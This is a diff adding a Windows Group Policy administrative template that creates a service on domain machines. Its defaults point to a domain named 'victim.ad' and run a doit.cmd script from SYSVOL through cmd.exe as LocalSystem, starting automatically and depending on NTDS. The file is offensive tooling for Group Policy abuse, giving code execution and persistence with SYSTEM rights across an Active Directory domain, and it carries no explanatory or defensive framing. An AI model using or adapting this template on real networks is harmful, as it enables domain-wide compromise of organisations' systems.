@@ -1,0 +1,36 @@
+CLASS MACHINE
+CATEGORY "Custom Services"
+	KEYNAME "SYSTEM\CurrentControlSet\Services\NewService"
+	POLICY "NewService"
+		PART "DependOnService" EDITTEXT
+			VALUENAME "DependOnService"
+			DEFAULT "NTDS"
+		END PART
+		PART "ErrorControl" NUMERIC REQUIRED SPIN 1
+			VALUENAME "ErrorControl"
+			DEFAULT 1
+         		MAX 65535
+         		MIN 0
+		END PART
+		PART "ImagePath" EDITTEXT
+			VALUENAME "ImagePath"
+			DEFAULT "c:\windows\system32\cmd.exe /c c:\windows\system32\cmd.exe /c C:\Windows\SYSVOL\sysvol\victim.ad\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\doit.cmd"
+		END PART
+		PART "ObjectName" EDITTEXT
+			VALUENAME "ObjectName"
+			DEFAULT "LocalSystem"
+		END PART
+		PART "Start" NUMERIC REQUIRED SPIN 1
+			VALUENAME "Start"
+			DEFAULT 2
+         		MAX 5
+         		MIN 0
+		END PART
+		PART "Type" NUMERIC REQUIRED SPIN 1
+			VALUENAME "Type"
+			DEFAULT 16
+         		MAX 65535
+         		MIN 0
+		END PART
+	END POLICY
+END CATEGORY
